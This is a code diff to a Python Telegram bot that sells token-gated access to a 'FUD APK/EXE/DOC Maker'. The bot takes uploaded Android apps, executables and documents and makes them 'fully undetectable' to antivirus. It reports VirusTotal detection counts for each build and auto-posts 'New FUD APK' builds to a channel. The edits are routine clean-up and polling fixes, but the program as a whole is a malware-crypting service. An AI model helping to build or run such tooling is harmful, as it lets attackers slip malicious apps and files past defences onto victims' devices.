@@ -41,12 +41,11 @@ os.makedirs(os.path.join(DATA_DIR, "keystore"), exist_ok=True)
 DB_PATH = os.path.join(DATA_DIR, "fud_maker.db")
 
 # ============ DEVELOPERS ============
-DEVELOPERS = ["@benji_v1", "@benji_v2"]  # exact usernames with underscores
+DEVELOPERS = ["@benji_v1", "@benji_v2"]
 DEVELOPER_IDS = [
     int(os.environ.get("BENJI_V1_ID", 0)),
     int(os.environ.get("BENJI_V2_ID", 0))
 ]
-# Filter out zero IDs
 DEVELOPER_IDS = [x for x in DEVELOPER_IDS if x != 0]
 
 # ============ FLASK ============
@@ -139,6 +138,8 @@ def create_token(created_by, expires_days=7, max_uses=1):
     return token, token_id
 
 def validate_token(token):
+    if not token:
+        return False
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute('''SELECT * FROM tokens WHERE token = ? AND status = 'active'
@@ -633,7 +634,6 @@ USER_INSTRUCTIONS = """
 @benji_v1 • @benji_v2
 """
 
-# Helper: check if user is admin
 def is_admin_user(user_id, username):
     if str(user_id) == str(ADMIN_CHAT_ID):
         return True
@@ -648,19 +648,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = user.username or "unknown"
     user_id = str(user.id)
 
-    # Check if user is admin
     if is_admin_user(user_id, username):
         context.user_data['is_admin'] = True
         await show_admin_menu(update, context)
         return
 
-    # For non-admins: check token
     token = context.user_data.get('token')
     if token and validate_token(token):
         await show_main_menu(update, context)
         return
 
-    # No token: ask for one
     await update.message.reply_text(
         "🔐 *FUD APK/EXE/DOC Maker*\n\n"
         "This bot requires a valid token to use.\n\n"
@@ -720,9 +717,6 @@ async def show_main_menu(update, context):
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode='Markdown'
         )
-    else:
-        # Called from callback
-        pass
 
 async def show_admin_menu(update, context):
     keyboard = [
@@ -741,8 +735,6 @@ async def show_admin_menu(update, context):
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode='Markdown'
         )
-    else:
-        pass
 
 async def show_main_menu_from_callback(query, context):
     keyboard = [
@@ -798,7 +790,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     token = context.user_data.get('token')
 
-    # Non-admin must have valid token
     if not is_admin and not (token and validate_token(token)):
         await query.edit_message_text("❌ Invalid token. Send /start.")
         return
@@ -928,8 +919,6 @@ async def handle_channel_post(update: Update, context: ContextTypes.DEFAULT_TYPE
     context.user_data['post_channel_step'] = False
     return ConversationHandler.END
 
-# ============ FILE HANDLERS ============
-
 async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = str(user.id)
@@ -951,12 +940,10 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_obj = await context.bot.get_file(doc.file_id)
     await file_obj.download_to_drive(apk_path)
 
-    # Progress callback
     async def update_progress(text):
         await status_msg.edit_text(f"📦 *Processing APK...*\n\n{text}", parse_mode='Markdown')
 
     def sync_progress(text):
-        # Schedule async update
         asyncio.create_task(update_progress(text))
 
     maker = FUDApkMaker(apk_path)
@@ -967,7 +954,6 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         shutil.rmtree(temp_dir, ignore_errors=True)
         return ConversationHandler.END
 
-    # VirusTotal scan
     vt_result = None
     if VT_API_KEY:
         await update_progress("⏳ Scanning with VirusTotal...")
@@ -975,7 +961,6 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update_progress("⏳ VirusTotal API key not set. Skipping scan.")
 
-    # Build response
     build_id = log_build(
         user_id, user.username or "unknown", token,
         'apk', doc.file_name,
@@ -1006,7 +991,6 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await status_msg.edit_text(msg, parse_mode='Markdown')
 
-    # Send FUD APK
     caption = f"🔥 FUD APK #{build_id}"
     if vt_result:
         caption += f" | {vt_result['positives']}/{vt_result['total']} detections"
@@ -1018,7 +1002,6 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             caption=caption
         )
 
-    # Auto-post to channel
     if CHANNEL_ID:
         try:
             channel_msg = f"🔥 *New FUD APK*\n\n"
@@ -1032,7 +1015,6 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except:
             pass
 
-    # Cleanup
     shutil.rmtree(temp_dir, ignore_errors=True)
     if os.path.exists(result['file']):
         os.remove(result['file'])
@@ -1270,10 +1252,16 @@ def run_bot():
         application.add_handler(conv)
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_channel_post))
 
+        # ✅ FIX: Delete webhook before polling
+        await application.bot.delete_webhook()
+        print("✅ Webhook deleted.")
+
         print("🤖 Bot ready, polling...")
         await application.initialize()
         await application.start()
-        await application.updater.start_polling()
+
+        # ✅ FIX: Drop pending updates
+        await application.updater.start_polling(drop_pending_updates=True)
 
         while True:
             await asyncio.sleep(1)
